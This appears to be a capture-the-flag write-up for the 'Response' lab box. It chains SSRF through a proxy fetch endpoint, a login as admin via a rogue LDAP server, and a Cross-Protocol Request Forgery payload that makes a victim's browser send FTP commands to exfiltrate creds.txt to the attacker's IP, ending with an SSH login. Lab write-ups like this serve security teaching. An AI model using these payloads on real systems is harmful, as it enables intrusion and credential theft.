## Overview

Response is an insane-rated Linux box and one of the most chain-heavy web foothold paths on the platform. Reaching `user.txt` means turning a harmless-looking "status fetch" proxy into Server-Side Request Forgery, abusing an internal chat app that trusts a client-supplied LDAP backend to log in as `admin`, and then leveraging Cross-Protocol Request Forgery to make a victim's browser talk FTP and leak credentials. This post stops at the user flag.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22   | OpenSSH | login target once creds land |
| 80   | nginx   | redirects to `www.response.htb` |

```bash
nmap -sC -sV 10.129.8.81
```

Port 80 redirects to `http://www.response.htb`, so the box is vhost-driven. Fuzzing virtual hosts reveals more of the surface:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://10.129.8.81 -H 'Host: FUZZ.response.htb' -c -fs 145
```

This surfaces `chat`, `api` (both `403`), and `proxy` (`200`).

## Enumeration

The `www` status page loads `main.js.php`, which calls an internal API through a server-side fetcher:

```text
POST http://proxy.response.htb/fetch
{ "url": "http://api.response.htb/", "method": "GET", "session": "...", ...digests... }
```

`proxy.response.htb/fetch` is a server-side HTTP client that retrieves whatever URL it's given — the classic shape of an SSRF primitive. That's the way into the `403`-walled internal apps (`api`, `chat`), which are only reachable from the server itself.

## Foothold

The internal `chat` app uses `socket.io`. Reading its client source (pulled through the SSRF proxy) shows the login flow sends an `authserver` field along with the username and password:

```text
40{"username":"guest","password":"guest","authserver":"ldap.response.htb"}
```

The server authenticates against whatever LDAP host the **client** names. So we stand up our own LDAP server with an `admin` entry and a password we control:

```bash
docker run -e LDAP_ORGANISATION="response" -e LDAP_DOMAIN="response.htb" \
  -e LDAP_ADMIN_PASSWORD="<redacted>" --detach osixia/openldap:1.5.0
# add an admin user with a known password, then log in pointing authserver at our IP
```

Logged in as `admin`, a chatbot user (`bob`) shares internal FTP credentials and asks `admin` to send a link he'll open in his browser. That's the setup for **Cross-Protocol Request Forgery**: we host JavaScript that makes `bob`'s browser issue an FTP request (active mode) using those creds and exfiltrate `creds.txt`:

```javascript
xhr.open('POST','ftp://<ftp_user>:<redacted>@<internal_ftp>/');
xhr.send('USER <ftp_user>\r\nPASS <redacted>\r\nPORT <our_ip_octets>,<p1>,<p2>\r\nRETR creds.txt\r\n');
```

`creds.txt` contains `bob`'s SSH password, which logs us straight in:

```bash
sshpass -p '<redacted>' ssh bob@10.129.8.81
```

```bash
cat /home/bob/user.txt   # HTB{...}
```

Access as `bob` achieved — the foothold is complete.
